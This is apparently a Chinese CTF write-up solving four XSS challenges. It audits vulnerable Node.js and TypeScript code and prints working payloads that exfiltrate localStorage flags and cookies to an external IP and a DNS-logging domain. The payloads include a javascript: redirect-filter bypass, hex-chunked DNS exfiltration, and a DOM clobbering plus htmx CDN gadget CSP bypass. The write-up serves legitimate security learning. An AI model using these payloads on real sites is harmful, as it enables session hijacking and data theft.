+++
date = '2026-03-18T21:00:00+08:00'
lastmod = '2026-03-18T21:05:00+08:00'
draft = false
title = '几道 XSS 题目的 WriteUP'
categories = ['WriteUP', 'Web', 'Nodejs']
tags = ['WriteUP', 'Web', 'Nodejs']

+++

### Baby XSS 1

审计源代码，我们发现这里直接存在 XSS 漏洞，构造 payload 去利用即可。

```js
app.get('/', (req, res) => {
    // Read the HTML file
    let processedHtml;
    const filePath = path.join(__dirname, 'public', 'pages', 'index.html');
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading file:', err);
            return res.status(500).send('Error loading page');
        }
        if ('q' in req.query) {
        // Process the template
        const searchQuery = req.query.q;
        processedHtml = data.replace(
            /<!-- SERVER-SIDE-TEMPLATE-START -->([\s\S]*?)<!-- SERVER-SIDE-TEMPLATE-END -->/,
            `<!-- SERVER-SIDE-TEMPLATE-START -->
        <div class="search-result">
            <h3>Search Results</h3>
            <p>No results found for: ${searchQuery}</p>
        </div>
        <!-- SERVER-SIDE-TEMPLATE-END -->`
        );
    } else {
            processedHtml = data.replace(
            /<!-- SERVER-SIDE-TEMPLATE-START -->([\s\S]*?)<!-- SERVER-SIDE-TEMPLATE-END -->/,'')
        }
        res.send(processedHtml);
    });
});
```

本题的 flag 是储存在 bot 的 `localStorage` 中，代码如下。

```js
await page.evaluate((flag) => {
	localStorage.setItem("flag", flag);
}, FLAG);
```

我们构造以下 URL，并将它发送给 admin bot 即可，数据包如下。

```html
<script>window.location=`http://47.115.148.66:1234/?flag=${localStorage.getItem("flag")}`;</script>
```

数据包如下。

```plaintext
POST /submit HTTP/1.1
Host: babyxss1.chal.secjhu.club
Connection: keep-alive
sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

url=http://localhost:8399/?q=%3Cscript%3Ewindow%2Elocation%3D%60http%3A%2F%2F47%2E115%2E148%2E66%3A1234%2F%3Fflag%3D%24%7BlocalStorage%2EgetItem%28%22flag%22%29%7D%60%3B%3C%2Fscript%3E
```

### Toddler XSS 2

根据题目提示，这里是存在 DOM XSS 漏洞的，我们审计代码，发现之前的漏洞已经被修复，但是引入重定向的功能，代码如下。

```html
<div id="navbar">
	<a href="#">Home</a>
	<a href="#">About</a>
	<a href="#">Contact</a>
	<div class="dropdown">
		<button class="dropbtn">Career Hub [NEW!]</button>
		<div class="dropdown-content">
			<a href="/?redirect=https://www.apple.com/careers/">Apple</a>
			<a href="/?redirect=https://www.amazon.jobs/">Amazon</a>
			<a href="/?redirect=https://careers.google.com/">Google</a>
			<a href="/?redirect=https://careers.microsoft.com/">Microsoft</a>
		</div>
	</div>
</div>
```

重定向部分的相关 js 代码如下。

```js
if (window.location.search) {
	const url = new URL(window.location.href);
	const redirect = url.searchParams.get('redirect');
	if (redirect) {
		safeRedirect(redirect);
	}
}

function safeRedirect(url) {
	if ((url.includes('apple.com') || url.includes('amazon.jobs') || url.includes('google.com') || url.includes('microsoft.com')) && !url.includes('flag')) {
		window.location.href = url;
	} else {
		document.body.innerHTML = '<h1>Malicious URL detected</h1>';
	}
}
```

我们搜索资料，发现在 `window.location.href` 的过程中，是可以通过伪协议去执行 js 代码的，那么我们去构造 payload，这里虽然做了一些限制，我们简单的绕过一下即可。

```plaitext
/?redirect=javascript:const k=localStorage.key(0);window.location=`http://47.115.148.66:1234/?data=${localStorage.getItem(k)}`;apple.com;
```

我们让 bot 访问以下 URL 即可。

```plaintext
http://localhost:8399/?redirect=javascript%3Aconst%20k%3DlocalStorage%2Ekey%280%29%3Bwindow%2Elocation%3D%60http%3A%2F%2F47%2E115%2E148%2E66%3A1234%2F%3Fdata%3D%24%7BlocalStorage%2EgetItem%28k%29%7D%60%3Bapple%2Ecom%3B
```

### Pretty Chatbot

我们看到这里存在 dompurify 过滤字符，所以我们是不能直接在页面上进行 XSS 的。

```typescript
// Sanitize the HTML using DOMPurify with allowlist for ECharts
const cleanContent = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: [
    	'div', 'p', 'br', 'strong', 'em', 'code', 'pre', 'blockquote',
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'a',
        'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'span'
    ],
    ALLOWED_ATTR: [
        'class', 'id', 'data-echarts-config', 'style', 'href', 'src', 
    	'alt', 'title', 'target', 'rel'
    ],
    ALLOW_DATA_ATTR: true,
});
```

我们继续审计代码，发现一个关键的逻辑。

```typescript
/**
 * Parses an ECharts option string and converts it to a JavaScript object
 * @param {string} optStr - The option string containing ECharts configuration
 * @returns {object} The parsed ECharts option object
 * @throws {Error} When the option format is invalid
 */
const parseOption = (optStr: string) => {
  try {
    return new Function(`return ${optStr.trim()}`)();
  } catch (error) {
    throw new Error('Invalid ECharts option format');
  }
};
```

我们发现这里会接收一个字符串，并且会对其进行 `new Function` 去调用，也就是说，这里可以执行 javascript 代码，那么我们怎么控制这个字符串呢？我们看到这个是对 echarts 的一个解析方法，只要我们构造一个特殊的 echarts 块，它就会将里面的内容放到 `parseOption` 中运行。

````markdown
```echarts
(() => {
  const img = new Image();
  img.src = "https://47.115.148.66:1234/?data=" + encodeURIComponent(docum
ent.cookie);
  return {
    xAxis: { type: 'category', data: ['A', 'B'] },
    yAxis: { type: 'value' },
    series: [{ type: 'bar', data: [1, 2] }]
  };
})()
```
````

我们经过测试发现，似乎是因为存在安全限制，bot 只能对外发出 https 请求，那么我们用 nginx 去搭一个 https 的站，然后去看它的访问日志，就可以看到 flag 了。

#### DNS 外带

首先，我们要知道使用 DNS 外带会存在几个问题：

- DNS 对域名中的大小写是不敏感的，也就是说它直接外带的数据是存在失真的，那么自然也就不能通过直接外带或者 base64 编码来带出精准的信息
- 其次，DNS 请求是对域名长度有限的，我们不能一次外带过长的数据
- 还有，外带的数据中的某些特殊字符会影响外带，例如 `=`、`{}` 等等

那么，在这一题中，我们要如何去解决这些问题呢？

我们可以对数据进行 hex 编码，如果数据过长，我们可以分片外带，payload 如下。

```typescript
(() => {
  const data = document.cookie;
  let enc = '';
  for (let i = 0; i < data.length; i++) {
    const charCode = data.charCodeAt(i);
    const hexCode = charCode.toString(16).padStart(2, '0');
    enc += hexCode;
  }
  const img = new Image();
  img.src = `https://${enc.substr(0,10)}.7xagsn.ceye.io/`;
  return {
    xAxis: { type: 'category', data: ['A', 'B'] },
    yAxis: { type: 'value' },
    series: [{ type: 'bar', data: [1, 2] }]
  };
})()
```

数据包如下，不断修改截取的部分，直到接收完数据为止。

```plaintext
POST /visit HTTP/1.1
Host: admin-bot.chal.secjhu.club
Connection: keep-alive
sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json

{"url": "https://pretty-chatbot.chal.secjhu.club/?message=%60%60%60echarts%0A%28%28%29%20%3D%3E%20%7B%0A%20%20const%20data%20%3D%20document%2Ecookie%3B%0A%20%20let%20enc%20%3D%20%27%27%3B%0A%20%20for%20%28let%20i%20%3D%200%3B%20i%20%3C%20data%2Elength%3B%20i%2B%2B%29%20%7B%0A%20%20%20%20const%20charCode%20%3D%20data%2EcharCodeAt%28i%29%3B%0A%20%20%20%20const%20hexCode%20%3D%20charCode%2EtoString%2816%29%2EpadStart%282%2C%20%270%27%29%3B%0A%20%20%20%20enc%20%2B%3D%20hexCode%3B%0A%20%20%7D%0A%20%20const%20img%20%3D%20new%20Image%28%29%3B%0A%20%20img%2Esrc%20%3D%20%60https%3A%2F%2F%24%7Benc%2Esubstr%280%2C10%29%7D%2E7xagsn%2Eceye%2Eio%2F%60%3B%0A%20%20return%20%7B%0A%20%20%20%20xAxis%3A%20%7B%20type%3A%20%27category%27%2C%20data%3A%20%5B%27A%27%2C%20%27B%27%5D%20%7D%2C%0A%20%20%20%20yAxis%3A%20%7B%20type%3A%20%27value%27%20%7D%2C%0A%20%20%20%20series%3A%20%5B%7B%20type%3A%20%27bar%27%2C%20data%3A%20%5B1%2C%202%5D%20%7D%5D%0A%20%20%7D%3B%0A%7D%29%28%29%0A%60%60%60"}
```

最终，截取到了 0-60 的数据，去掉部分重复部分，我们获得了 flag。

![](../assets/e43f537c5c1fc1eac9e8d8289ccfeb5a.png)

![](../assets/8d97fe84e3ef9f1f9973a01fffdd5c35.png)

### Job Clobbering

这题是前面 Toddler XSS 2 的升级版，本题设置了严格的标签过滤，并且还设置了 CSP 防御，下面是相关代码，这里是限制了只允许执行本域名下的 js 脚本以及 `https://cdnjs.cloudflare.com` 域名下的 js 脚本，但是允许使用 `eval()` 等动态执行脚本的方法。

```js
// app.js
app.use((req, res, next) => {
    res.set('Content-Security-Policy',
        "script-src 'self' https://cdnjs.cloudflare.com 'unsafe-eval'; style-src 'self' https://unpkg.com/ 'unsafe-inline';");
    next();
});
```

虽然存在可能的 XSS 点，但是也是充满了过滤。

```js
// utils.js
function renderMessageBoard(user, message, date) {
    const messageElement = document.createElement('div');
    messageElement.classList.add('message');
    messageElement.innerHTML = DOMPurify.sanitize(`
      <div class="message-header">
        <strong>${user}</strong>
        <span class="message-date">${new Date(date).toLocaleString()}</span>
      </div>
      <p>${message}</p>
    `);
    return messageElement;
}
```

#### 加载外部 js 脚本

我们有两点要做，第一，我们要绕过 CSP 的限制，执行特定的 js 代码，第二，我们要能够 XSS，针对这两点，在晨曦✌大手的发力下，找到了第一个关键点，不得不说晨曦✌还是太敏锐了，我其实也见过这篇文章，但是没有第一时间发现端倪，以下是相关文章 [DOM clobbering - 参考文章](https://portswigger.net/web-security/dom-based/dom-clobbering)。

> A common pattern used by JavaScript developers is:
> 
> `var someObject = window.someObject || {};`
> 
> If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor. Consider the following code:
> 
> `<script> window.onload = function(){ let someObject = window.someObject || {}; let script = document.createElement('script'); script.src = someObject.url; document.body.appendChild(script); }; </script>`
> 
> To exploit this vulnerable code, you could inject the following HTML to clobber the `someObject` reference with an anchor element:
> 
> `<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>`
> 
> As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.

具体意思是，当开发者使用上述类似的代码时，我们可以用 DOM 节点（如锚点元素 `<a>`）去破坏 `someObject` 的引用，由于两个锚点元素使用相同的 `id`，DOM 会将它们组合到一个 DOM 集合中。随后，这个 DOM 污染向量会用该 DOM 集合覆盖 `someObject` 引用。最后一个锚点元素上使用 `name` 属性，是为了覆盖 `someObject` 对象的 `url` 属性，使其指向外部恶意脚本。

而在我们审计代码的时候，可以发现与漏洞代码非常相似的代码逻辑如下。

```js
// ::Deprecated:: remove at next version
function loadMessageBoardJS(){
    let utilJS = window.utilsJS || {};
    let script = document.createElement('script');
    script.src = utilJS.url;
    document.body.appendChild(script);
};
```

这也就意味着我们可以修改 payload，从而控制 `utilsJS` 对象的 `url` 属性，从而控制 `script.src` ，让其加载我们指定的 js 脚本，测试发现，浏览器确实对指定的 URL 发出了请求。

```html
<a id=utilsJS><a id=utilsJS name=url href=//example.com>
```

#### 绕过 CSP 限制

一顿搜索学习，找到了 [相关文章](https://xz.aliyun.com/news/4716)，我们可以通过 CDN 的一些存在漏洞的第三方库来实现绕过，从而执行 js 代码，在本题中，我们要挑选出合适的存在漏洞的第三方 js 脚本来进行 XSS 攻击，由于前面存在过滤，以及只能覆盖一次 `utilsJS` 的 `url` 属性，我们要挑选出不需要其他 js 脚本作为依赖的，以及 payload 不会被 DOMPurify 过滤的漏洞脚本。

我们可以通过一个总结了许多可以利用的库的网站来快速检索，该网站链接如下 [GMSGadget](https://gmsgadget.com/)，经过筛选我们找到了这个库。

![](../assets/06682188f7c4ce08b46d0bb393d78e83.png)

那么我们可以利用它的 payload 去进行调整，先去加载库。

```html
<a id=utilsJS><a id=utilsJS name=url href=//cdnjs.cloudflare.com/ajax/libs/htmx/2.0.6/htmx.min.js>
```

再去执行构造好的 js 代码。

```html
<img src="x" data-hx-on-error='alert(1)'>
```

我们可以看到也是执行成功了。

![](../assets/d31cce837f4966179de839dbcb07387b.png)

我们调整恶意 js 代码，让它能够外带数据。

```html
<img src="x" data-hx-on-error="window.location=`https://${localStorage.getItem('flag').replace('{','_').replace('}','_').replace('=','_')}.7xagsn.ceye.io/`;">
```

发送数据包。

```plaintext
POST /submit HTTP/1.1
Host: jobclobbering-7da87c98fbb93b73.chal.secjhu.club
Connection: keep-alive
sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded

url=http://localhost:8399/#messages
```

#### 遇到的问题

本地倒是通了，不知道为啥远端死活没反应，连个请求都没有，不知道是啥问题了。

#### 深入研究

后来，我去拿题目名字搜索了一下发现，这道题其实是在靠 DOM Clobbering 扩展 XSS，简单来说，DOM Clobbering 就是一种将 HTML 代码注入页面中以操纵 DOM 并最终更改页面上 JavaScript 行为的技术，可以阅读这篇[文章](https://xz.aliyun.com/news/6925)作为参考。

我们发现，通过 HTML 标签的 `id` 或者 `name` 属性，我们可以在 `document` 或者 `window` 对象下创建一个对象，那么我们可以利用这一点，来对原有的对象进行覆盖，例如下面的操作。

```html
<body>
    <div><img name=cookie></div>
    <script>
        console.log(document.cookie);
    </script>
</body>
```

结果如下。

![](../assets/63589fc7e26700702a31f204e1ae00ac.png)

所以，就有我们前面的覆盖 `window.utilsJS.url` 的攻击 payload。

